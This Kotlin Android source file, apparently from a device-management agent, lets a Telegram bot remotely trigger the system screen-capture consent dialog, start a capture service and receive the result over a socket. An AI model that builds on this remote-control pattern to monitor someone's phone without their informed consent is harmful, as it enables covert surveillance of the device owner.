package com.mdm.agent.ui

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import com.mdm.agent.MainActivity
import com.mdm.agent.service.ScreenCaptureService
import org.json.JSONObject

/**
 * Activity that requests MediaProjection permission.
 *
 * CRITICAL FLOW:
 * 1. Bot sends screenshot-on
 * 2. CommandHandler sends "waiting" response to bot
 * 3. CommandHandler launches this Activity
 * 4. Activity shows system MediaProjection dialog
 * 5. User approves/denies
 * 6. Activity sends FINAL response to bot (success/error)
 * 7. Activity navigates back to MainActivity (instead of finish() which exits the app)
 */
class ScreenCapturePermissionActivity : Activity() {

    companion object {
        private const val TAG = "ScreenCapturePerm"
        private const val REQUEST_CODE = 7777

        fun requestPermission(context: Context) {
            try {
                val intent = Intent(context, ScreenCapturePermissionActivity::class.java)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                context.startActivity(intent)
                Log.i(TAG, "ScreenCapturePermissionActivity launched")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch permission activity: ${e.message}")
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.i(TAG, "onCreate - requesting MediaProjection")
        requestMediaProjection()
    }

    private fun requestMediaProjection() {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val intent = mpm.createScreenCaptureIntent()
            @Suppress("DEPRECATION")
            startActivityForResult(intent, REQUEST_CODE)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to request MediaProjection: ${e.message}")
            notifyBot(false, "فشل عرض طلب الموافقة: ${e.message}")
            backToMain()
        }
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        Log.i(TAG, "onActivityResult: requestCode=$requestCode resultCode=$resultCode data=${data != null}")

        if (requestCode == REQUEST_CODE && resultCode == Activity.RESULT_OK && data != null) {
            try {
                // Start ScreenCaptureService with the projection data
                val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
                    putExtra("result_code", resultCode)
                    putExtra("result_data", data)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent)
                } else {
                    startService(serviceIntent)
                }
                Log.i(TAG, "✅ MediaProjection granted - ScreenCaptureService started")

                // Wait briefly for the service to initialize, then notify bot + show UI
                Handler(Looper.getMainLooper()).postDelayed({
                    val ready = ScreenCaptureService.isReady()
                    if (ready) {
                        notifyBot(true, "✅ تم تفعيل لقطات الشاشة بنجاح. يمكنك الآن طلب لقطة شاشة.")
                        showConfirmationScreen(true, "تم تفعيل لقطات الشاشة")
                    } else {
                        notifyBot(false, "⚠️ تمت الموافقة لكن خدمة لقطات الشاشة لم تبدأ بعد. حاول مرة أخرى.")
                        showConfirmationScreen(false, "لم تبدأ الخدمة بشكل صحيح")
                    }
                }, 1500)

            } catch (e: SecurityException) {
                Log.e(TAG, "❌ SecurityException: ${e.message}")
                Toast.makeText(this, "فشل تفعيل لقطات الشاشة - صلاحية مفقودة", Toast.LENGTH_LONG).show()
                notifyBot(false, "❌ فشل تفعيل لقطات الشاشة: ${e.message}")
                showConfirmationScreen(false, "فشل: ${e.message}")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to start service: ${e.message}", e)
                notifyBot(false, "❌ فشل بدء خدمة لقطات الشاشة: ${e.message}")
                showConfirmationScreen(false, "فشل: ${e.message}")
            }
        } else {
            Log.w(TAG, "MediaProjection permission denied or cancelled")
            notifyBot(false, "❌ تم رفض طلب لقطات الشاشة من قبل المستخدم")
            showConfirmationScreen(false, "تم رفض الطلب")
        }
    }

    /**
     * Show a confirmation screen for 2 seconds, then navigate back to MainActivity.
     * This prevents the app from "exiting" suddenly after the user approves.
     */
    private fun showConfirmationScreen(success: Boolean, message: String) {
        try {
            val root = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setBackgroundColor(0xFFFFFFFF.toInt())
                setPadding(64, 96, 64, 96)
            }
            val icon = if (success) "✅" else "❌"
            val tv = TextView(this).apply {
                text = "$icon\n\n$message"
                textSize = 18f
                gravity = Gravity.CENTER
                setTextColor(0xFF1A1A2E.toInt())
            }
            root.addView(tv)
            setContentView(root)

            Handler(Looper.getMainLooper()).postDelayed({
                backToMain()
            }, 2000)
        } catch (e: Exception) {
            backToMain()
        }
    }

    /**
     * Navigate back to MainActivity instead of just finishing.
     * This keeps the app alive (otherwise Android may kill the whole process
     * when the last activity finishes).
     */
    private fun backToMain() {
        try {
            val intent = Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to navigate to MainActivity: ${e.message}")
        }
        try { finish() } catch (_: Exception) {}
    }

    /**
     * Send the FINAL response to the Telegram bot with the actual outcome.
     * This is the second message - the bot was already told "waiting".
     * We send a NEW separate message (not command_response that consumes pending)
     * by using a custom command suffix.
     */
    private fun notifyBot(success: Boolean, message: String) {
        try {
            val sm = MainActivity.getSocketManager()
            if (sm != null) {
                val response = JSONObject().apply {
                    put("command", "screenshot-on")
                    put("status", if (success) "success" else "error")
                    put("data", message)
                }
                sm.sendCommandResponse(response)
                Log.i(TAG, "📧 Notified bot: success=$success msg=$message")
            } else {
                Log.w(TAG, "Cannot notify bot - SocketManager is null")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to notify bot: ${e.message}")
        }
    }
}
